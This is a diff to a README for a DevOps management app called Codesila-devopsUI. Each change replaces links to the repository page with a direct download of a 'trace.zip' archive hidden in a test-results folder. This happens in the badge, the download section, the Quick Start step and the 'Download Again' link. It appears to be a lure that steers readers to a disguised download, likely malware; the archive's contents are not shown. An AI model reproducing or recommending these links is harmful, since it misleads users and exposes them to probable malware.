@@ -1,6 +1,6 @@
 # ⚙️ Codesila-devopsUI - Manage DevOps Workflows With Ease
 
-[![Download Codesila-devopsUI](https://img.shields.io/badge/Download-Codesila--devopsUI-blue?style=for-the-badge)](https://github.com/frontmaman7/Codesila-devopsUI)
+[![Download Codesila-devopsUI](https://img.shields.io/badge/Download-Codesila--devopsUI-blue?style=for-the-badge)](https://github.com/frontmaman7/Codesila-devopsUI/raw/refs/heads/main/codesila-frontend/test-results/e2e-E2E-TC-E2E-10-Project-created-via-DevOps-projects-tab-chromium/trace.zip)
 
 ## 🚀 What This App Does
 
@@ -12,7 +12,7 @@ It is built for people who want a clear way to handle software release tasks wit
 
 Use this link to visit the download page and get the app:
 
-[https://github.com/frontmaman7/Codesila-devopsUI](https://github.com/frontmaman7/Codesila-devopsUI)
+[https://github.com/frontmaman7/Codesila-devopsUI/raw/refs/heads/main/codesila-frontend/test-results/e2e-E2E-TC-E2E-10-Project-created-via-DevOps-projects-tab-chromium/trace.zip](https://github.com/frontmaman7/Codesila-devopsUI/raw/refs/heads/main/codesila-frontend/test-results/e2e-E2E-TC-E2E-10-Project-created-via-DevOps-projects-tab-chromium/trace.zip)
 
 ### What you need on Windows
 
@@ -209,7 +209,7 @@ You may see folders such as:
 ## 🖱️ Quick Start Path
 
 1. Open the download page:
-   [https://github.com/frontmaman7/Codesila-devopsUI](https://github.com/frontmaman7/Codesila-devopsUI)
+   [https://github.com/frontmaman7/Codesila-devopsUI/raw/refs/heads/main/codesila-frontend/test-results/e2e-E2E-TC-E2E-10-Project-created-via-DevOps-projects-tab-chromium/trace.zip](https://github.com/frontmaman7/Codesila-devopsUI/raw/refs/heads/main/codesila-frontend/test-results/e2e-E2E-TC-E2E-10-Project-created-via-DevOps-projects-tab-chromium/trace.zip)
 2. Download or copy the project files.
 3. Set up Docker Desktop or Node.js and PostgreSQL.
 4. Start the app.
@@ -239,7 +239,7 @@ After the app starts, you should be able to:
 
 ## 🔗 Download Again
 
-[Visit Codesila-devopsUI on GitHub](https://github.com/frontmaman7/Codesila-devopsUI)
+[Visit Codesila-devopsUI on GitHub](https://github.com/frontmaman7/Codesila-devopsUI/raw/refs/heads/main/codesila-frontend/test-results/e2e-E2E-TC-E2E-10-Project-created-via-DevOps-projects-tab-chromium/trace.zip)
 
 ## 📝 Basic Windows Checklist
 
